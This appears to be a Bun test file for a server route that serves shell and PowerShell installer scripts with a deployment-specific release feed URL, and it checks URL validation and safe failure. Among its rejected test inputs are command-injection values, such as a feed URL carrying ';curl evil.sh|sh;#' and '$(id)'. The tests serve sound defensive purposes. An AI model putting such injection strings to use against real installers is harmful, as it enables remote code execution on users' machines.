import { expect, test } from "bun:test";

import { isNonLocalizedRequest } from "../src/server";
import {
  installPs1Handler,
  installShHandler,
  isValidReleaseFeedUrl,
  resolveReleaseFeedUrl,
  withDeploymentFeedUrl,
} from "../src/server/install/install-script.server";

const STAGING = { COFORGE_RELEASE_FEED_URL: "https://releases-staging.coforge.cn" };
const PRODUCTION_FEED_URL = "https://releases.coforge.cn";

async function sourceOf(name: string): Promise<string> {
  return await Bun.file(new URL(`../../../scripts/release/${name}`, import.meta.url)).text();
}

test("the installer script paths bypass Paraglide localization (never 307-redirected)", () => {
  expect(isNonLocalizedRequest(new Request("http://localhost/computer/install.sh"))).toBe(true);
  expect(isNonLocalizedRequest(new Request("http://localhost/computer/install.ps1"))).toBe(true);
  // A locale-prefixed variant is not a documented entry point and is not exempted from this
  // predicate - it still goes through paraglideMiddleware, which (verified against the built
  // server) de-localizes it back to this same route and serves it too. That is harmless (nobody
  // links to it) and out of scope to prevent; this assertion only pins isNonLocalizedRequest's
  // own behavior, not what paraglideMiddleware later does with a `false` result.
  expect(isNonLocalizedRequest(new Request("http://localhost/en/computer/install.sh"))).toBe(false);
});

test("the localization bypass is the two exact paths, not a /computer/ prefix", () => {
  // Widening this predicate to `pathname.startsWith("/computer/")` exempts application routes
  // from localization, and until these negative cases existed no test noticed.
  expect(isNonLocalizedRequest(new Request("http://localhost/computer/install.shX"))).toBe(false);
  expect(isNonLocalizedRequest(new Request("http://localhost/computer/install.sh/"))).toBe(false);
  expect(isNonLocalizedRequest(new Request("http://localhost/computer/other"))).toBe(false);
  expect(isNonLocalizedRequest(new Request("http://localhost/computers/abc"))).toBe(false);
});

test("GET /computer/install.sh returns 200 plain text starting with the POSIX shebang", async () => {
  const response = installShHandler(STAGING);
  expect(response.status).toBe(200);
  expect(response.headers.get("content-type")).toBe("text/plain; charset=utf-8");
  expect(response.headers.get("cache-control")).toBe("no-cache");
  expect(response.headers.get("x-content-type-options")).toBe("nosniff");
  const body = await response.text();
  expect(body.startsWith("#!/bin/sh")).toBe(true);
  // The served bytes must be install.sh's own bytes apart from the one substituted feed line, so
  // that what runs on a user's machine cannot drift from the file shellcheck and
  // packages/computer/test/installer-scripts.test.ts actually exercise.
  const source = await sourceOf("install.sh");
  expect(body).toBe(
    source.replace(
      `default_feed_url="${PRODUCTION_FEED_URL}"`,
      `default_feed_url="${STAGING.COFORGE_RELEASE_FEED_URL}"`,
    ),
  );
});

test("GET /computer/install.ps1 returns 200 plain text", async () => {
  const response = installPs1Handler(STAGING);
  expect(response.status).toBe(200);
  expect(response.headers.get("content-type")).toBe("text/plain; charset=utf-8");
  const body = await response.text();
  expect(body.length).toBeGreaterThan(0);
  const source = await sourceOf("install.ps1");
  expect(body).toBe(
    source.replace(
      `$defaultFeedUrl = "${PRODUCTION_FEED_URL}"`,
      `$defaultFeedUrl = "${STAGING.COFORGE_RELEASE_FEED_URL}"`,
    ),
  );
});

test("a deployment never serves a script pointing at another deployment's feed", async () => {
  // The whole point of the substitution: `curl https://staging.../install.sh | sh` installing the
  // production build is the failure this route exists to prevent.
  for (const handler of [installShHandler, installPs1Handler]) {
    const body = await handler(STAGING).text();
    expect(body).not.toContain(PRODUCTION_FEED_URL);
    expect(body).toContain(STAGING.COFORGE_RELEASE_FEED_URL);
  }
});

test("an unconfigured or unusable feed URL yields 503, never a 200 with the wrong feed", async () => {
  const rejected: Array<Record<string, string | undefined>> = [
    {},
    { COFORGE_RELEASE_FEED_URL: "" },
    { COFORGE_RELEASE_FEED_URL: "   " },
    { COFORGE_RELEASE_FEED_URL: "http://releases-staging.coforge.cn" },
    { COFORGE_RELEASE_FEED_URL: "https://releases-staging.coforge.cn/" },
    { COFORGE_RELEASE_FEED_URL: 'https://x.cn";curl evil.sh|sh;#' },
  ];
  for (const environment of rejected) {
    for (const handler of [installShHandler, installPs1Handler]) {
      const response = handler(environment);
      expect(response.status).toBe(503);
      const body = await response.text();
      // Even piped straight into a shell, every line of the failure body is a comment.
      expect(body.split("\n").every((line) => line === "" || line.startsWith("#"))).toBe(true);
    }
  }
});

test("isValidReleaseFeedUrl accepts a bare https origin and rejects everything else", () => {
  expect(isValidReleaseFeedUrl("https://releases-staging.coforge.cn")).toBe(true);
  expect(isValidReleaseFeedUrl("https://releases.coforge.cn:8443")).toBe(true);

  expect(isValidReleaseFeedUrl("http://releases.coforge.cn")).toBe(false); // not https
  expect(isValidReleaseFeedUrl("https://user:pw@evil.cn")).toBe(false); // credentials
  expect(isValidReleaseFeedUrl("https://releases.coforge.cn/feed")).toBe(false); // path
  expect(isValidReleaseFeedUrl("https://releases.coforge.cn?x=1")).toBe(false); // query
  expect(isValidReleaseFeedUrl("https://releases.coforge.cn#f")).toBe(false); // fragment
  expect(isValidReleaseFeedUrl("https://a.cn$(id)")).toBe(false); // shell metacharacter
  expect(isValidReleaseFeedUrl("https://a.cn`id`")).toBe(false); // shell metacharacter
  expect(isValidReleaseFeedUrl("https://a.cn ")).toBe(false); // whitespace
  expect(isValidReleaseFeedUrl("releases.coforge.cn")).toBe(false); // not a URL
});

test("resolveReleaseFeedUrl trims, and reports unusable values as absent", () => {
  expect(resolveReleaseFeedUrl({ COFORGE_RELEASE_FEED_URL: "  https://a.cn  " })).toBe(
    "https://a.cn",
  );
  expect(resolveReleaseFeedUrl({ COFORGE_RELEASE_FEED_URL: "http://a.cn" })).toBeNull();
  expect(resolveReleaseFeedUrl({})).toBeNull();
});

test("substitution fails loudly when the script's anchor line drifts", () => {
  // If install.sh is reworded, this must throw (a 500) rather than quietly serve the production
  // feed to a staging user.
  expect(() => withDeploymentFeedUrl("no anchor here", 'x="1"', "https://a.cn")).toThrow(
    /exactly one/,
  );
  expect(() => withDeploymentFeedUrl('x="1"\nx="1"\n', 'x="1"', "https://a.cn")).toThrow(/found 2/);
});

test("the anchor lines this server rewrites still exist verbatim in both scripts", async () => {
  // Guards the substitution against a script edit that lands without touching this file.
  const sh = await sourceOf("install.sh");
  const ps1 = await sourceOf("install.ps1");
  expect(sh.split(`default_feed_url="${PRODUCTION_FEED_URL}"`).length - 1).toBe(1);
  expect(ps1.split(`$defaultFeedUrl = "${PRODUCTION_FEED_URL}"`).length - 1).toBe(1);
});
